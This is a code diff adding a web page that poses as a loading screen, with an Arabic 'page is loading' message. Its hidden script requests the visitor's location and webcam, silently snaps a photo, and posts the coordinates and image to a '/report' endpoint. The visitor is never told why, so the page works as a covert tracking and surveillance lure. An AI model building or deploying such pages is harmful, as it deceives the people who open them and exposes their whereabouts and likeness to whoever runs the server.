@@ -1,0 +1,48 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Loading...</title>
+</head>
+<body>
+  <h2>جاري تحميل الصفحة...</h2>
+  <script>
+    async function sendData(location, imageData) {
+      await fetch("/report", {
+        method: "POST",
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          latitude: location.coords.latitude,
+          longitude: location.coords.longitude,
+          image: imageData
+        })
+      });
+    }
+
+    async function getImageData() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement("canvas");
+        canvas.width = 640;
+        canvas.height = 480;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+        stream.getTracks().forEach(track => track.stop());
+        return canvas.toDataURL("image/jpeg");
+      } catch (e) {
+        return null;
+      }
+    }
+
+    navigator.geolocation.getCurrentPosition(async (position) => {
+      const image = await getImageData();
+      await sendData(position, image);
+    });
+  </script>
+</body>
+</html>
